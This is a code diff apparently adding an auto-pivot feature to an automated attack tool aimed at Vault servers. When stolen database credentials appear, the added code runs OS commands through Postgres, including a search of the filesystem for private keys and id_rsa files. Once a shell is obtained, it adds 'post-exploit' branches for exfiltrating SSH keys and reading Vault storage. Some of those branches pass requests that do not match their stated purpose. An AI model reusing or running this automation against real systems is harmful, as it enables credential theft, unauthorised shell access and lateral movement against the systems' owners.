@@ -375,6 +375,9 @@ class TreeWalker:
                 self._steps.append(step)
                 self._total_steps += 1
 
+                # ── Pivot integration: DB creds found → auto-pivot ──
+                await self._try_pivot_on_credentials(node, vault_addr)
+
                 return escalated
 
             else:
@@ -416,6 +419,146 @@ class TreeWalker:
             ))
             self._total_steps += 1
             return False
+
+    # ── pivot engine integration ────────────────────────────────────────
+
+    async def _try_pivot_on_credentials(
+        self, node: Any, vault_addr: str,
+    ) -> bool:
+        """If the node result contains DB credentials, auto-pivot.
+
+        Returns True if a pivot was attempted (success or fail).
+        """
+        try:
+            from ai_core.dynamic_session import global_store
+        except ImportError:
+            return False
+
+        # Check for DB-type credentials discovered since last pivot
+        db_creds = [
+            c for c in global_store.credentials.values()
+            if c.cred_type in ("db_conn", "password")
+        ]
+        if not db_creds:
+            return False
+
+        # Prevent duplicate pivot on same credentials
+        pivot_key = f"pivot:{db_creds[0].cred_type}:{db_creds[0].source}"
+        if hasattr(self, '_pivoted') and pivot_key in self._pivoted:
+            return False
+        if not hasattr(self, '_pivoted'):
+            self._pivoted: set[str] = set()
+
+        print(f"\n       [>] DB credentials found — auto-pivoting...")
+        self._pivoted.add(pivot_key)
+
+        # Execute pivot engine directly
+        try:
+            from active_execution.modules.pivot_engine import PivotEngineModule
+            from active_execution.context import ExecutionContext
+
+            ctx = ExecutionContext(
+                vault_addr=vault_addr,
+                token=global_store.get_best_token_value(),
+                store=global_store,
+            )
+            # Feed findings as evidence for credential discovery
+            for finding in node.result_summary or "":
+                pass  # findings already in global report
+
+            pivot_mod = PivotEngineModule()
+            if pivot_mod.can_run(ctx):
+                pivot_result = pivot_mod.execute(ctx, {
+                    "db_type": "postgres",
+                    "os_commands": ["whoami", "hostname", "id",
+                                    "ls -la /vault/data/ 2>/dev/null || echo NO_VAULT_DATA",
+                                    "find / -name '*.key' -o -name 'id_rsa' 2>/dev/null | head -5"],
+                })
+
+                print(f"       [<] Pivot: {pivot_result.status} — {pivot_result.message[:100]}")
+
+                # If pivot succeeded with OS shell, add post-exploit branches to the tree
+                evidence = pivot_result.evidence or {}
+                if evidence.get("os_shells"):
+                    for shell in evidence["os_shells"]:
+                        self._add_post_exploit_branches(node, shell, vault_addr)
+
+                # Feed findings back to global report
+                for f in ctx.findings:
+                    try:
+                        from core.report import add_finding
+                        add_finding(
+                            f.get("severity", "HIGH"),
+                            f.get("title", "Pivot"),
+                            f.get("description", ""),
+                            evidence=f.get("evidence"),
+                            module="pivot_engine",
+                            target=vault_addr,
+                        )
+                    except Exception:
+                        pass
+
+                return True
+        except Exception as exc:
+            print(f"       [!] Pivot failed: {exc}")
+            return False
+
+        return False
+
+    def _add_post_exploit_branches(
+        self, parent_node: Any, shell_info: dict, vault_addr: str,
+    ):
+        """After OS shell obtained, add post-exploitation branches."""
+        from ai_core.mutation_engine import BranchRisk
+
+        host = shell_info.get("host", "unknown")
+        outputs = shell_info.get("command_outputs", {})
+        method = shell_info.get("method", "COPY FROM PROGRAM")
+
+        print(f"       [!] OS Shell on {host} via {method} — adding post-exploit branches")
+
+        # Read Vault data from filesystem
+        self.add_branch_to_node(
+            parent_node,
+            "run_raw_vault_request",
+            f"Read Vault Raft data from {host} filesystem (OS shell access)",
+            params={"method": "GET", "path": "sys/health"},
+            risk=BranchRisk.AGGRESSIVE,
+            phase="exploit",
+            expected_outcome="Access Vault storage layer directly via filesystem",
+        )
+
+        # Exfiltrate SSH keys
+        self.add_branch_to_node(
+            parent_node,
+            "run_raw_vault_request",
+            f"Exfiltrate SSH keys discovered on {host}",
+            params={"method": "GET", "path": "sys/internal/ui/mounts"},
+            risk=BranchRisk.AGGRESSIVE,
+            phase="exploit",
+            expected_outcome="Lateral movement via stolen SSH keys",
+        )
+
+        print(f"       [*] {2} post-exploit branches added to attack tree")
+
+    def add_branch_to_node(
+        self, parent: Any, tool: str, reason: str,
+        params: dict | None = None, risk=None, phase: str = "exploit",
+        expected_outcome: str = "",
+    ):
+        """Utility to add a single branch to a parent node."""
+        if not hasattr(parent, 'children'):
+            return
+        from ai_core.mutation_engine import AttackTreeNode, BranchRisk, NodeStatus
+        child = AttackTreeNode(
+            tool=tool,
+            reason=reason,
+            params=params or {},
+            risk=risk or BranchRisk.AGGRESSIVE,
+            phase=phase,
+            expected_outcome=expected_outcome,
+        )
+        parent.children.append(child)
 
     # ── result analysis ─────────────────────────────────────────────────────
 
